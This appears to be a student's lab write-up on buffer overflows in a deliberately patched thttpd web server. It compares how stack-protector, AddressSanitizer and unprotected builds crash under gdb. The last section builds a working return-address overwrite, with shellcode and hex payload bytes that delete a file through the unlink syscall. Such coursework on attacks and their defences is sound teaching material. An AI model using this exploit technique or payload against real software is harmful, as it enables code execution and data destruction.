Dominic Loftus

1/
First I checked to make sure the path was correct by using
which gcc
which gave the output
/usr/local/cs/bin/gcc
So there was nothing to change there

2/
Then I downloaded the tar file to my computer and used
scp ~/Desktop/sthttpd-2.27.0.tar.gz \
    loftus@lnxsrv09.seas.ucla.edu:~/Project3_cs33
which downloaded the file to the linux server

I unzipped it using
tar -xvzf sthttpd-2.27.0.tar.gz
which created sthttpd-2.27.0 directory

I then got the patchfile from the website. The link didn't work so I
copy and pasted the text from the website into a file named patchfile

I entered the sthttpd-2.27.0 directory
Then used command
patch -p1 patchfile
to patch the needed files

Then I used 
./configure \
   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
to configure the folder

And then the commands
make clean
make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd src/thttpd-sp
make clean
make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
mv src/thttpd src/thttpd-as
make clean
make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd src/thttpd-no
to compile and rename the executables
(AS version wasn't crashing, -static-libasan flag recommended from piazza
made it work)

3/
Next is to figure out what port to run each executable on with the formula
(12330 + 3 * (204910863 % 293) + (1,2,3)) with (1,2,3) being mapped to
(sp,as,no)
so SP will be run on port 12754
AS will be run on port 12755
and NO will be run on port 12756

4/
To verify that the web servers work correctly I first created a text file
foo.txt containing only the word "Hello".

I then opened another terminal window (terminal 2) and cd'd into the same
directory that foo.txt was in. In the original window (terminal 1) I went
into the same directory as terminal 2 and in terminal 1 ran the command
./src/thttpd-sp -p 12754 -D
which seemed to do nothing, just leave an open prompt that did nothing when
text was entered

Then in terminal 2 while the previous command was running in terminal 1 entered
the command
curl http://localhost:12754/foo.txt
which output "Hello"
I also tried the same but using the AS and NO thttpd's and both worked as well

5/
Next was to figure out a way to cause SP to crash. Based on the patch we
applied I assumed it had to do with reading the config file option.
I took a look at the source code for the read_config function and found
that it looks for keywords in the config file to set certain values to.
One in particular was the port option.
I created a file called config.txt and entered "port=" followed by 200
consecutive 'a' values.
I then ran the command
gdb ./src/thttpd-sp
and then
(gdb) r -p 12754 -D -C config.txt
which caused the program to crash and give the following error

*** stack smashing detected ***: /w/home.20/ch/ugrad/loftus/Project3_cs33/sthttpd-2.27.0/src/thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1

I then ran a backtrace on the program
(gdb) bt
which produced the following

#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000404165 in read_config (filename=<optimized out>)
    at thttpd.c:1129
#7  0x6161616161616161 in ?? ()
#8  0x6161616161616161 in ?? ()
#9  0x6161616161616161 in ?? ()
#10 0x6161616161616161 in ?? ()
#11 0x6161616161616161 in ?? ()
#12 0x6161616161616161 in ?? ()
#13 0x6161616161616161 in ?? ()
#14 0x6161616161616161 in ?? ()
#15 0x6161616161616161 in ?? ()
#16 0x6161616161616161 in ?? ()
#17 0x6161616161616161 in ?? ()
#18 0x6161616161616161 in ?? ()
#19 0x6161616161616161 in ?? ()
#20 0x6161616161616161 in ?? ()
#21 0x6161616161616161 in ?? ()
#22 0x6161616161616161 in ?? ()
#23 0x6161616161616161 in ?? ()
#24 0x6161616161616161 in ?? ()
#25 0x6161616161616161 in ?? ()
#26 0x6161616161616161 in ?? ()
#27 0x6161616161616161 in ?? ()
#28 0x6161616161616161 in ?? ()
#29 0x6161616161616161 in ?? ()
#30 0x6161616161616161 in ?? ()
#31 0x0000000000000061 in ?? ()
#32 0x0000000000000000 in ?? ()

It looks like the problem is coming from line 1129 in thttpd.c, in the
read_config function, however setting breakpoints there didn't catch the
problem before it happened. So I then set a breakpoint at function read_config
(gdb) b read_config
and ran the program using
(gdb) r -p 12754 -D -C config.txt
which stopped at read_config

I used
(gdb) s
repeatedly to step through the function and find what caused the crash

The crash occured after line 1189 in thttpd.c with the line
(void) fclose( fp );

I then deleted my old breakpoint and set a new one at line 1189, I then ran
the program again but used
(gdb) set disassemble-next-line on
to get the assembly code for the line that caused the crash

1189        (void) fclose( fp );
=> 0x0000000000404045 <read_config+1141>:       4c 89 f7        mov    %r14,%rdi
   0x0000000000404048 <read_config+1144>:       e8 33 e3 ff ff  callq  0x402380
 <fclose@plt>
   0x000000000040404d <read_config+1149>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
   0x0000000000404052 <read_config+1154>:       64 48 33 04 25 28 00 00 00     
 xor    %fs:0x28,%rax
   0x000000000040405b <read_config+1163>:       0f 85 ff 00 00 00 jne    0x404160 <read_config+1424>
   0x0000000000404061 <read_config+1169>:       48 83 c4 70 add    $0x70,%rsp
   0x0000000000404065 <read_config+1173>:       5b pop    %rbx
   0x0000000000404066 <read_config+1174>:       5d pop    %rbp
   0x0000000000404067 <read_config+1175>:       41 5c     pop    %r12
   0x0000000000404069 <read_config+1177>:       41 5d     pop    %r13
   0x000000000040406b <read_config+1179>:       41 5e     pop    %r14
   0x000000000040406d <read_config+1181>:       c3 retq

I then used
(gdb) ni
to execute each instruction.
The jne instruction at memory address 0x40405b was executed and jumped to
the 1129 line I had originally tried to locate. It generated the following
assembly code. More specifically it jumped to a specific call instruction
that would never be executed normally because of the jmpq command before it.

1129                              hostname = e_strdup( value );
   0x000000000040414c <read_config+1404>:               4c 89 ef mov    %r13,%rdi
   0x000000000040414f <read_config+1407>:               e8 2c fa ff ff  callq  0x403b80 <e_strdup>
   0x0000000000404154 <read_config+1412>:               48 89 05 2d 2e 21 00   mov    %rax,0x212e2d(%rip)        # 0x616f88 <hostname>
   0x000000000040415b <read_config+1419>:               e9 d5 fd ff ff jmpq   0x403f35 <read_config+869>
=> 0x0000000000404160 <read_config+1424>:               e8 8b e2 ff ff callq  0x4023f0 <__stack_chk_fail@plt>
   0x0000000000404165 <read_config+1429>:               0f 1f 00 nopl   (%rax)

by using
(gdb) ni
I found the crash to happen at the command
0x0000000000404160 <read_config+1424>:               e8 8b e2 ff ff callq  0x4023f0 <__stack_chk_fail@plt>

It appears that the SP version generates assembly code that checks for
potential stack overflow before exiting the program with the jump to the
stack_chk_fail call

6/
First running
gdb ./src/thttpd-as

and then
(gdb)r -p 12755 -D -C config.txt
cause the program to crash with the error message

==43230==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffccc4 at pc 0x00000048a72c bp 0x7fffffffcc20 sp 0x7fffffffc3d0
READ of size 347 at 0x7fffffffccc4 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1

and generate the backtrace
(gdb) bt

#0  0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7073fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00000000004de8d3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
    this=0x7fffffffaec0, pc=4761388, max_depth=<optimized out>)
    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:124
#3  0x0000000000416ba7 in __asan::GetStackTraceWithPcBpAndContext (fast=false, 
    context=0x0, bp=140737488342048, pc=4761388, max_depth=256, stack=0x7fffffffaec0)
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_stack.h:46
#4  __asan::ErrorGeneric::Print (
    this=this@entry=0x991748 <__asan::ScopedInErrorReport::current_error_+8>)
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_errors.cc:446
#5  0x00000000004d95e4 in __asan::ErrorDescription::Print (
    this=0x991740 <__asan::ScopedInErrorReport::current_error_>)
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_errors.h:338
#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb746, 
    __in_chrg=<optimized out>)
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_report.cc:136
#7  __asan::ReportGenericError (pc=4761388, bp=bp@entry=140737488342048, 
    sp=sp@entry=140737488339920, addr=addr@entry=140737488342212, 
    is_write=is_write@entry=false, access_size=access_size@entry=347, exp=0, fatal=false)
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_report.cc:397
#8  0x000000000048a74b in __interceptor_strchr (s=<optimized out>, c=<optimized out>)
    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:618
#9  0x000000000050b6de in read_config (filename=<optimized out>) at thttpd.c:1018
#10 0x6161616161616161 in ?? ()
#11 0x6161616161616161 in ?? ()
#12 0x6161616161616161 in ?? ()
#13 0x6161616161616161 in ?? ()
#14 0x6161616161616161 in ?? ()
#15 0x6161616161616161 in ?? ()
#16 0x6161616161616161 in ?? ()
#17 0x6161616161616161 in ?? ()
#18 0x6161616161616161 in ?? ()
#19 0x6161616161616161 in ?? ()
#20 0x6161616161616161 in ?? ()
#21 0x6161616161616161 in ?? ()
#22 0x6161616161616161 in ?? ()
#23 0x6161616161616161 in ?? ()
#24 0x6161616161616161 in ?? ()
#25 0x6161616161616161 in ?? ()
#26 0x0000000000000a61 in ?? ()
#27 0x00000000004066f0 in ?? ()
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_errors.h:332
#28 0x00000000004dc709 in __asan::GetCurrentThreadStats ()
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_stats.cc:116
#29 0x00000000004086b9 in __asan::AsanMapUnmapCallback::OnMap (
--Type <RET> for more, q to quit, c to continue without paging--
    this=this@entry=0x7fffffffce2f, p=<optimized out>, size=7016996765293437281)
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_allocator.cc:183
#30 0x000000000040e5f3 in __sanitizer::SizeClassAllocator64<__asan::AP64>::MapWithCallback (this=<optimized out>, size=<optimized out>, beg=<optimized out>)
    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_common.h:429
#31 __sanitizer::SizeClassAllocator64<__asan::AP64>::EnsureFreeArraySpace (
    num_freed_chunks=<optimized out>, region_beg=7017102318409703777, 
    region=0x6161616161616161, this=<optimized out>)
    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_allocator_primary64.h:652
#32 __sanitizer::SizeClassAllocator64<__asan::AP64>::PopulateFreeArray (
    this=<optimized out>, stat=<optimized out>, class_id=<optimized out>, 
    region=0x6161616161616161, requested_count=<optimized out>)
    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_allocator_primary64.h:713
#33 0x0000000000b28960 in __sanitizer::theDepot ()
#34 0x00007fffffffcfc0 in ?? ()
#35 0x0000000000000000 in ?? ()


It appears that the problem comes in read_config around line 1018

So I set a breakpoint at line 1018 in thttpd.c and used
(gdb) set disassemble-next-line on
and then ran the program with the same input as before.

The program stopped at the breakpoint and output the following

1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
=> 0x000000000050b6d0 <read_config+176>:	48 8b 3c 24	mov    (%rsp),%rdi
   0x000000000050b6d4 <read_config+180>:	be 23 00 00 00	mov    $0x23,%esi
   0x000000000050b6d9 <read_config+185>:	e8 e2 f2 f7 ff	callq  0x48a9c0 <__interceptor_strchr(char const*, int)>
   0x000000000050b6de <read_config+190>:	48 85 c0	test   %rax,%rax
   0x000000000050b6e1 <read_config+193>:	74 23	je     0x50b706 <read_config+230>

I then stepped through this line using
(gdb) ni

The program crashed on the command
0x000000000050b6d9 <read_config+185>:        e8 e2 f2 f7 ff  callq  0x48a9c0 <__interceptor_strchr(char const*, int)>

The address sanitizer flag uses an auxiliary function to check for errors to sanitize.
Obviously it found the buffer overflow caused by the line above and it caused
the program to crash


7/

Next was the NO version to try starting with the command
gdb ./src/thttpd-no
(gdb) r -p 12756 -D -C config.txt

which produced the following error and backtrace

Program received signal SIGSEGV, Segmentation fault.
0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
1189	    (void) fclose( fp );

(gdb) bt
#0  0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
#1  0x6161616161616161 in ?? ()
#2  0x6161616161616161 in ?? ()
#3  0x6161616161616161 in ?? ()
#4  0x6161616161616161 in ?? ()
#5  0x6161616161616161 in ?? ()
#6  0x6161616161616161 in ?? ()
#7  0x6161616161616161 in ?? ()
#8  0x6161616161616161 in ?? ()
#9  0x6161616161616161 in ?? ()
#10 0x6161616161616161 in ?? ()
#11 0x6161616161616161 in ?? ()
#12 0x6161616161616161 in ?? ()
#13 0x6161616161616161 in ?? ()
#14 0x6161616161616161 in ?? ()
#15 0x6161616161616161 in ?? ()
#16 0x6161616161616161 in ?? ()
#17 0x6161616161616161 in ?? ()
#18 0x6161616161616161 in ?? ()
#19 0x6161616161616161 in ?? ()
#20 0x6161616161616161 in ?? ()
#21 0x6161616161616161 in ?? ()
#22 0x6161616161616161 in ?? ()
#23 0x6161616161616161 in ?? ()
#24 0x6161616161616161 in ?? ()
#25 0x0000000000000061 in ?? ()
#26 0x0000000000000000 in ?? ()

It seems as though the crash must be coming from line 1189.

So I ran it again with the same command as before but with a breakpoint set
at line 1189 and
(gdb) set disassemble-next-line on

This gave the output
1189	    (void) fclose( fp );
=> 0x0000000000403f65 <read_config+1125>:	4c 89 f7	mov    %r14,%rdi
   0x0000000000403f68 <read_config+1128>:	e8 b3 e3 ff ff	callq  0x402320 <fclose@plt>
   0x0000000000403f6d <read_config+1133>:	48 83 c4 70	add    $0x70,%rsp
   0x0000000000403f71 <read_config+1137>:	5b	pop    %rbx
   0x0000000000403f72 <read_config+1138>:	5d	pop    %rbp
   0x0000000000403f73 <read_config+1139>:	41 5c	pop    %r12
   0x0000000000403f75 <read_config+1141>:	41 5d	pop    %r13
   0x0000000000403f77 <read_config+1143>:	41 5e	pop    %r14
   0x0000000000403f79 <read_config+1145>:	c3	retq 

I repeatedly ran
(gdb) ni
until the program crashed after the command
0x0000000000403f79 <read_config+1145>:       c3      retq

Because there is no stack protection in this program, the overflowed file that was
input likely overwrote other data on the stack, and when the function tried to
return a value that was incorrect, because of the execstack flag it tried anyways
and crashed due to accessing an inappropriate return value.


8/

Next to generate the assembly code, I entered the src directory and entered
the commands

make clean
gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . \
    thttpd.c -o thttpd-sp.s
make clean
gcc -S -O2 -fno-inline -static-libasan -fsanitize=address -I .. -I . \
    thttpd.c -o thttpd-as.s
make clean
gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . \
    thttpd.c -o thttpd-no.s

to generate the assembly codes

When looking at the handle read functions, the SP and NO versions were
practically identical, however the AS version was much longer and more
complex. Because SP only looks to preserve the stack, there aren't really
any ways in the handle_read function that could corrupt the stack. The
AS version however needs to look for potentially corrupted memory addresses
and generates a lot of extra code to do so. There are many compare instructions
and conditional jumps to locations that call error functions like
__asan_report_load8 or __asan_report_store8
to ensure no memory is corrupted


9/

First I needed to find the difference between the return address of the
read_config function and the char array line.

This is done by running gdb with thttpd-no
gdb ./src/thttpd-no
(gdb) b read_config
(gdb) r -C foo.txt
which stopped at line 
I used this command to print the address of the array
(gdb) p &line
which gave
$1 = (char (*)[100]) 0x7fffffffce10
and this command to 
(gdb) info reg $rsp
rsp            0x7fffffffcea8      0x7fffffffcea8

The difference between the rsp address and the line address is
0x7fffffffcea8 - 0x7fffffffce10 = 0x98 = 152 dec

Next was to find the hex value of "victim.txt" by doing
emacs temp.txt
and entering the string "victim.txt"

by using the command
xxd temp.txt
I got the following output
0000000: 7669 6374 696d 2e74 7874      	     victim.txt
This is 10 bytes however for alignment should by placed 16 bytes below the
start of the rsp address at 0x7fffffffce98

Next was to find the byte code to move the above value to the register
that recieve the value passed to the function, %rdi by creating temp.s
that contains the line
movq $0x7fffffffce98, %rdi

I then ran the commands
gcc -c temp.s
objdump -d temp.o
which produced the following
0000000000000000 <.text>:
   0:	48 bf 98 ce ff ff ff 	movabs $0x7fffffffce98,%rdi
   7:	7f 00 00

Next I needed to get the assembly code/hex machine instructions for the
unlink system call
using
(gdb) disas /r unlink
gave the following dump

Dump of assembler code for function unlink:
   0x00007ffff76c03a0 <+0>:	b8 57 00 00 00	mov    $0x57,%eax
   0x00007ffff76c03a5 <+5>:	0f 05	syscall 
   0x00007ffff76c03a7 <+7>:	48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
   0x00007ffff76c03ad <+13>:	73 01	jae    0x7ffff76c03b0 <unlink+16>
   0x00007ffff76c03af <+15>:	c3	retq   
   0x00007ffff76c03b0 <+16>:	48 8b 0d b9 4a 2d 00	mov    0x2d4ab9(%rip),%rcx        # 0x7ffff7994e70
   0x00007ffff76c03b7 <+23>:	f7 d8	neg    %eax
   0x00007ffff76c03b9 <+25>:	64 89 01	mov    %eax,%fs:(%rcx)
   0x00007ffff76c03bc <+28>:	48 83 c8 ff	or     $0xffffffffffffffff,%rax
   0x00007ffff76c03c0 <+32>:	c3	retq   
End of assembler dump.

with the necessary bytecode instructions being
b8 57 00 00 00  mov    $0x57,%eax
0f 05   syscall

So in order to store the address and execute the syscall we can use the bytecode
48 bf 98 ce ff ff ff 7f 00 00 b8 57 00 00 00 0f 05
which is 17 bytes

we also need the name of the file and its address (in little endian notation)
76 69 63 74 69 6d 2e 74 78 74 00 00 00 00 00 00 10 ce ff ff ff 7f 00 00
which is 24 bytes

So to reach the 160 bytes needed with alignment we must add 00 bytes between
these two byte instructions, however to address the need for "port=" (5 bytes)
at the start of the file, we'll add 3 00 bytes to the beginning to address this.
This means that we need to insert 111 00 bytes between the byte instructions

which gives

00 00 00 48 bf 98 ce ff ff ff 7f 00 00 b8 57 00 00 00 0f 05 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 76
69 63 74 69 6d 2e 74 78 74 00 00 00 00 00 00 18 ce ff ff ff 7f 00 00

The line address at the end is offset by 8 to avoid the first 8 bytes of
"p o r t = 00 00 00"

I put this into a file called hex.txt and used the command
xxd -r -p hex.txt > exploit.txt
and then edited exploit.txt to put "port=" at the start

I then ran
touch victim.txt
gdb ./src/thttpd-no
(gdb) run -C exploit.txt (run on same port as before to make sure stack addresses don't change)

This caused a segmentation fault and stopped running. I then quit out of gdb
and checked for the victim.txt file. It had been deleted, meaning the
exploit worked.

It should be noted that this only works because stack randomization is disabled.
If it were enabled it would be very unlikely for this method to work.
